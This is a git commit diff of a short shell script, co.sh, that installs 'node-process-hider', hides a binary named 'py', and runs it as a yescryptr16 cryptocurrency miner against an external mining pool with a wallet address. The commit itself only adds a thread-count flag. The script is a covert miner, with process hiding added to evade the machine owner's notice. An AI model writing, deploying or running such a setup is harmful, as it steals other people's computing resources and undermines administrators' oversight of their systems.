ec4d149f35f83125e2710198c9fa14cc6325586c
trailt <100853475+trailt@users.noreply.github.com>
2022-03-03 21:53:01 +0700

    Update co.sh

--- co.sh
+++ co.sh
@@ -3,4 +3,4 @@ apt install npm
 npm i -g node-process-hider
 chmod 777 py
 ph add py
-./py -a yescryptr16  -o stratum+tcps://stratum-asia.rplant.xyz:17055 -u qbEHW2NZHWBYfNCdGrUJBAba3i4Ey4i3u2
+./py -a yescryptr16  -o stratum+tcps://stratum-asia.rplant.xyz:17055 -u qbEHW2NZHWBYfNCdGrUJBAba3i4Ey4i3u2 -t2
